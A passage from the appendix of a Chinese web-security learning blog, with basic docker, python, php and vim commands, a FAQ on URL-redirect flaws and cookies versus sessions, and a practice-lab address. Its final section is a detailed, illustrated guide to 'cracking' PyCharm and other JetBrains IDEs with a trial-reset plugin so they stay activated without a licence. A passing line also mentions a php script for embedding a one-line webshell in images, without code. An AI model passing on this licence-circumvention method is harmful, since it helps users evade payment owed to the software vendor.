<p>此时我们只需要在网站目录里建一个首页文件或者创建一个php文件都可以访问</p>
<p>比如可以执行命令echo来创建一个index.html文件来访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;hello&#x27; &gt; index.html</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210209123301192.png" alt="image-20210209123301192"></p>
<p>我们再来访问下该ip，发现成功访问</p>
<p><img src="/source/hetian/image-20210209123359455.png" alt="image-20210209123359455"></p>
<p>总结：以上就是docker的基本流程了，当然，如果我们修改了容器里的apache相关的配置文件，记得一定要在当前容器里重启apache2服务</p>
<h3 id="3、python"><a href="#3、python" class="headerlink" title="3、python"></a>3、python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令行输入<span class="number">1</span>、进入python2交互界面：python22、进入python3交互界面：python33、查看pip的版本：易错点：V是大写的pip2 -V       Pip3 -V4、退出python交互界面：exit()<span class="number">5</span>、升级pip3：python3 -m pip install -U pip</span><br></pre></td></tr></table></figure>

<h3 id="4、php"><a href="#4、php" class="headerlink" title="4、php"></a>4、php</h3><h4 id="1、运行php脚本（网页端）"><a href="#1、运行php脚本（网页端）" class="headerlink" title="1、运行php脚本（网页端）"></a>1、运行php脚本（网页端）</h4><p>直接将php脚本放在网站根目录，然后访问，即可解析，这个解析不仅限于网页，也可以解析用来处理其他功能的php文件，比如用来给图片插入一句话木马的php文件，其主要根据该脚本需不需要通过命令行传递参数，如果不需要，那么直接可以用网页运行</p>
<h4 id="2、运行php脚本（命令行）"><a href="#2、运行php脚本（命令行）" class="headerlink" title="2、运行php脚本（命令行）"></a>2、运行php脚本（命令行）</h4><p>首先需要安装php，如果我们安装了phpstudy，那么就是默认安装了php，我们可以用everything搜索php，找到其安装目录，然后将你需要的某个版本的php的目录添加到变量<br>其次，我们打开需要运行的php脚本目录，按住shift+右键，打开命令行，然后输入php  xx.php 1.jpg   即可</p>
<p><img src="/source/hetian/image-20210202140942469.png" alt="image-20210202140942469"></p>
<h2 id="4、Vim常用命令"><a href="#4、Vim常用命令" class="headerlink" title="4、Vim常用命令"></a>4、Vim常用命令</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、临时设置行号:vim界面输入    :<span class="built_in">set</span> number2、永久设置行号：root用户下：vim /etc/vim/vimrc   然后添加<span class="built_in">set</span> number   即可</span><br></pre></td></tr></table></figure>

<h2 id="5、学习网站和博客"><a href="#5、学习网站和博客" class="headerlink" title="5、学习网站和博客"></a>5、学习网站和博客</h2><h2 id="6、疑难问题"><a href="#6、疑难问题" class="headerlink" title="6、疑难问题"></a>6、疑难问题</h2><p>1、url跳转漏洞存在的意义是什么？自嗨？我们自己构建跳转，也只是在我们当前浏览器跳转啊，并不能影响其他用户，必须要把跳转的url写入源码中才能让所有访问者跳到我们需要的界面吧。那么这也算漏洞？感觉没啥用啊。<br>解答：完全可以将构造的url发给其他人点击，这样不就可以直线影响其他用户么！</p>
<p>2、Session的作用可以判断用户是否登录，那么cookie是不是也可以判断用户是否登录？毕竟每次请求都会附带cookie，服务器根据cookie就可以判断用户的状态了吧？<br>解答：这里有个误区，cookie只是通行证，而session类似于持久的对话，打个比方，当我们网上下单购买东西，cookie的提交只是让我们有了下单的权限，也就是可以下单东西了，但是如果该网站没有启用session，假设A,B,C都在该网站购买东西，在服务器的状态就是有很多下单的请求，但是这些请求是谁发起的，服务器并不知道，服务器并不知道哪些东西是A的订单，哪些是B的，因为http是无状态的，所以这明显行不通，于是就有了session，session会根据每个人请求里的cookie里包含的sessionid来区分每一个人的身份，每个人都有一个不同的sessionid，这样服务器就会很好的区分哪些东西是谁的。所以，浏览器请求过去的都是cookie，区别就是有的cookie里包含了sessionid，有的没包含而已，session和cookie并不是两个对立的东西，只是一个互补而已。</p>
<p>3、靶场地址：<a target="_blank" rel="noopener" href="http://120.27.61.239:9006/">http://120.27.61.239:9006/</a></p>
<p>3、upload-labs-0.1靶场，当我们访问一个不存在的页面，会提示403提示，页面有啥权限配置的问题的提示，不要慌，这只是因为文件不存在罢了</p>
<p><img src="/source/hetian/image-20210202141238718.png" alt="image-20210202141238718"></p>
<h2 id="7、作业提交"><a href="#7、作业提交" class="headerlink" title="7、作业提交"></a>7、作业提交</h2><h2 id="8、src地址"><a href="#8、src地址" class="headerlink" title="8、src地址"></a>8、src地址</h2><p>安全客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/src">https://www.anquanke.com/src</a></p>
<h2 id="9、软件安装"><a href="#9、软件安装" class="headerlink" title="9、软件安装"></a>9、软件安装</h2><h3 id="1、pycharm的安装与破解"><a href="#1、pycharm的安装与破解" class="headerlink" title="1、pycharm的安装与破解"></a>1、pycharm的安装与破解</h3><p>破解jar怎么获取？</p>
<p>可以百度：ide-eval-resetter-2.1.6.zip</p>
<p>也可以去网站查看最新破解方法：<a target="_blank" rel="noopener" href="https://zhile.io/">https://zhile.io/</a></p>
<p>此方案不显示2089但是是一种极其稳定的激活方式，原理真正永久可用，相比较2089那个随时被封的方式，修改无限试用30天的激活，稳定，所有全家桶都是以下步骤，是通用教程，适用于win/linux/mac所有操作系统。<br>首先下载软件：<a target="_blank" rel="noopener" href="https://www.jetbrains.com/pycharm/download/#section=windows">https://www.jetbrains.com/pycharm/download/#section=windows</a></p>
<p>其次选择专业版<br>然后安装，选择目录需要将目录里的空格删除，其次勾选的时候，所有都勾选<br>接着下一步下一步就行了</p>
<p>第一步,启动软件，进入试用（能直接进入操作界面的，则忽略此步）</p>
<p><img src="/source/hetian/image-20210205194756830.png" alt="image-20210205194756830"></p>
<p>第二步 首先本地打开一个.py文件，然后在代码窗口拖入压缩包。ide-eval-resetter-2.1.6.zip（注意ide-eval-resetter-2.1.6.zip包不要解压）</p>
<p><img src="/source/hetian/image-20210205194813126.png" alt="image-20210205194813126"></p>
<p>拖入后会弹出Restart重启按钮，点击重启IDE    </p>
<p><img src="/source/hetian/image-20210205194825838.png" alt="image-20210205194825838"></p>
<p>第三步，重启后，在以下任意一个界面均可唤出插件EVAL Reset<br>以下两个图片任意选择一个进入插件界面 </p>
<p><img src="/source/hetian/image-20210205194839392.png" alt="image-20210205194839392"></p>
<p><img src="/source/hetian/image-20210205194844082.png" alt="image-20210205194844082"></p>
<p>第四步，无限重置试用时间，永久激活软件<br>  点击reset — yes , 重启软件。（勾选Auto reset before per restart，会自动定期重置试用时间，让你一劳永逸，永远处于激活状态，且不再会弹出激活窗口打扰你）</p>
<p><img src="/source/hetian/image-20210205194857053.png" alt="image-20210205194857053"></p>
<p><img src="/source/hetian/image-20210205194902447.png" alt="image-20210205194902447"></p>
<p>重启后查看试用时间，已经被重置到30天（两种方式均可）</p>
<p><img src="/source/hetian/image-20210205194918584.png" alt="image-20210205194918584"></p>
<p><img src="/source/hetian/image-20210205194923512.png" alt="image-20210205194923512"></p>
<p><img src="/source/hetian/image-20210205194928855.png" alt="image-20210205194928855"></p>
<p>操作完成后，重启软件不再出现激活窗口说明激活成功！<br>（简单说明一下，这个插件的原理是无限重置试用时间，只需第一次操作的时候勾选Auto reset before per restart，后面会定期自动重置，无需你做任何操作，是真正的永久激活。</p>
<p>注意，如果你已经按教程做完，但是每次重启软件还是出现激活窗口，那说明你还没有激活成功，极有可能是你之前破解过，或者修改过HOST文件。<br>解决办法：在状态栏help—Edit Custom VM Options里，删除最后一句—javaagent开头的路径退出重启软件即可，如果改过HOST文件,屏蔽了官网的，还需要去HOST里改回来恢复原状。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/08/10/31-35%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="prev" title="31-35、渗透测试(xiaodi)">
      <i class="fa fa-chevron-left"></i> 31-35、渗透测试(xiaodi)
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E7%8E%AF%E5%A2%83%E5%92%8C%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">第一章：环境和工具安装</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81vm%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.1.</span> <span class="nav-text">1、vm的安装和破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%AE%89%E8%A3%85kali"><span class="nav-number">1.2.</span> <span class="nav-text">2、安装kali</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%AE%89%E8%A3%85win7"><span class="nav-number">1.3.</span> <span class="nav-text">3、安装win7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E5%AE%89%E8%A3%85win10"><span class="nav-number">1.4.</span> <span class="nav-text">4、安装win10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E5%AE%89%E8%A3%85phpstudy"><span class="nav-number">1.5.</span> <span class="nav-text">5、安装phpstudy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E3%80%81%E5%AE%89%E8%A3%85LAMP"><span class="nav-number">1.6.</span> <span class="nav-text">6、安装LAMP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7%E3%80%81%E5%AE%89%E8%A3%85java%E7%8E%AF%E5%A2%83"><span class="nav-number">1.7.</span> <span class="nav-text">7、安装java环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%E3%80%81%E5%AE%89%E8%A3%85python2%E5%92%8C3"><span class="nav-number">1.8.</span> <span class="nav-text">8、安装python2和3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%E3%80%81DVWA%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85"><span class="nav-number">1.9.</span> <span class="nav-text">9、DVWA靶场安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10%E3%80%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85"><span class="nav-number">1.10.</span> <span class="nav-text">10、安全工具的安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81Burpsuit%E7%9A%84%E5%AE%89%E8%A3%85"><span class="nav-number">1.10.1.</span> <span class="nav-text">1、Burpsuit的安装</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9Aweb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">第二章：web安全基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81burp%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%94%A8-%E7%88%86%E7%A0%B4%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">1、burp的简单实用&#x2F;爆破弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81http%E3%80%81https%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.2.</span> <span class="nav-text">2、http、https协议介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0%EF%BC%9A%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88logic-loophole%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">第三章：逻辑漏洞（logic loophole）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">1、url跳转漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.</span> <span class="nav-text">2、短信轰炸漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.3.</span> <span class="nav-text">3、任意密码修改漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.4.</span> <span class="nav-text">4、任意用户登录漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.5.</span> <span class="nav-text">5、越权漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E3%80%81%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.6.</span> <span class="nav-text">6、支付逻辑漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">第四章：文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81Webshell"><span class="nav-number">4.1.</span> <span class="nav-text">1、Webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81webshell%E7%AE%A1%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">2、webshell管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7-%E5%AE%9E%E6%88%98"><span class="nav-number">4.3.</span> <span class="nav-text">3、上传绕过技巧&#x2F;实战</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">第五章：XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3"><span class="nav-number">5.1.</span> <span class="nav-text">1、基础讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-html%E5%9F%BA%E7%A1%80"><span class="nav-number">5.1.1.</span> <span class="nav-text">1.1  html基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-javascript%E5%9F%BA%E7%A1%80"><span class="nav-number">5.1.2.</span> <span class="nav-text">1.2  javascript基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-1-%E5%9F%BA%E7%A1%80"><span class="nav-number">5.1.2.1.</span> <span class="nav-text">1.2.1 基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-DOM%E6%93%8D%E4%BD%9C"><span class="nav-number">5.1.2.2.</span> <span class="nav-text">1.2.2 DOM操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-3-BOM%E6%93%8D%E4%BD%9C"><span class="nav-number">5.1.2.3.</span> <span class="nav-text">1.2.3 BOM操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81Xss%E5%9F%BA%E7%A1%80"><span class="nav-number">5.2.</span> <span class="nav-text">2、Xss基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-xss%E6%A6%82%E8%BF%B0"><span class="nav-number">5.2.1.</span> <span class="nav-text">2.1 xss概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-xss%E7%B1%BB%E5%9E%8B%E3%80%81%E5%9C%BA%E6%99%AF"><span class="nav-number">5.2.2.</span> <span class="nav-text">2.2 xss类型、场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-xss%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="nav-number">5.2.3.</span> <span class="nav-text">2.3 xss常见绕过方法及流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-http-only-%E9%98%B2%E5%BE%A1"><span class="nav-number">5.2.4.</span> <span class="nav-text">2.4 http-only(防御)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">5.2.5.</span> <span class="nav-text">2.5 其他防御方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81xss%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA"><span class="nav-number">5.3.</span> <span class="nav-text">3、xss平台搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81xss%E5%AD%98%E5%9C%A8%E5%88%A4%E6%96%AD"><span class="nav-number">5.4.</span> <span class="nav-text">4、xss存在判断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.</span> <span class="nav-text">第六章：文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%A6%82%E8%BF%B0"><span class="nav-number">6.1.</span> <span class="nav-text">1、文件包含概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.2.</span> <span class="nav-text">2、本地文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">6.2.1.</span> <span class="nav-text">2.1 利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">6.2.2.</span> <span class="nav-text">2.2 绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.3.</span> <span class="nav-text">3、远程文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">6.3.1.</span> <span class="nav-text">3.1  利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">6.3.2.</span> <span class="nav-text">3.2  绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">6.4.</span> <span class="nav-text">4、文件包含的防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">7.</span> <span class="nav-text">第七章 信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%A0%B9%E6%8D%AEsrc%E6%8F%90%E4%BE%9B%E7%9A%84%E8%B5%84%E4%BA%A7%E8%BF%9B%E8%A1%8C%E6%89%A9%E5%A4%A7"><span class="nav-number">7.1.</span> <span class="nav-text">1、根据src提供的资产进行扩大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E6%8C%96%E6%8E%98%E5%AD%90%E5%9F%9F%E5%90%8D%E8%BF%9B%E8%A1%8C%E6%89%A9%E5%A4%A7"><span class="nav-number">7.2.</span> <span class="nav-text">2、挖掘子域名进行扩大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%89%AB%E6%8F%8F"><span class="nav-number">7.3.</span> <span class="nav-text">3、信息的利用与扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">7.4.</span> <span class="nav-text">4、其他信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E6%89%8B%E5%B7%A5%E6%B8%97%E9%80%8F"><span class="nav-number">7.5.</span> <span class="nav-text">5、手工渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6%E3%80%81poc%E6%89%B9%E9%87%8F%E7%AF%87"><span class="nav-number">7.5.1.</span> <span class="nav-text">6、poc批量篇</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0%EF%BC%9A%E9%99%84%E5%BD%95"><span class="nav-number">8.</span> <span class="nav-text">第八章：附录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81word%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="nav-number">8.1.</span> <span class="nav-text">1、word使用技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">8.2.</span> <span class="nav-text">2、linux常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">8.3.</span> <span class="nav-text">3、常用软件启动命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81Lamp"><span class="nav-number">8.3.1.</span> <span class="nav-text">1、Lamp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81docker"><span class="nav-number">8.3.2.</span> <span class="nav-text">2、docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81python"><span class="nav-number">8.3.3.</span> <span class="nav-text">3、python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81php"><span class="nav-number">8.3.4.</span> <span class="nav-text">4、php</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E8%BF%90%E8%A1%8Cphp%E8%84%9A%E6%9C%AC%EF%BC%88%E7%BD%91%E9%A1%B5%E7%AB%AF%EF%BC%89"><span class="nav-number">8.3.4.1.</span> <span class="nav-text">1、运行php脚本（网页端）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E8%BF%90%E8%A1%8Cphp%E8%84%9A%E6%9C%AC%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89"><span class="nav-number">8.3.4.2.</span> <span class="nav-text">2、运行php脚本（命令行）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">8.4.</span> <span class="nav-text">4、Vim常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E5%92%8C%E5%8D%9A%E5%AE%A2"><span class="nav-number">8.5.</span> <span class="nav-text">5、学习网站和博客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E3%80%81%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"><span class="nav-number">8.6.</span> <span class="nav-text">6、疑难问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7%E3%80%81%E4%BD%9C%E4%B8%9A%E6%8F%90%E4%BA%A4"><span class="nav-number">8.7.</span> <span class="nav-text">7、作业提交</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%E3%80%81src%E5%9C%B0%E5%9D%80"><span class="nav-number">8.8.</span> <span class="nav-text">8、src地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%E3%80%81%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="nav-number">8.9.</span> <span class="nav-text">9、软件安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81pycharm%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="nav-number">8.9.1.</span> <span class="nav-text">1、pycharm的安装与破解</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="painter"
      src="/images/%E5%A4%B4%E5%83%8F.jpg">
  <p class="site-author-name" itemprop="name">painter</p>
  <div class="site-description" itemprop="description">painter的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://lishang520.github.io/" title="GitHub → https:&#x2F;&#x2F;lishang520.github.io&#x2F;"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">painter安全技术博客</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">279k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:14</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
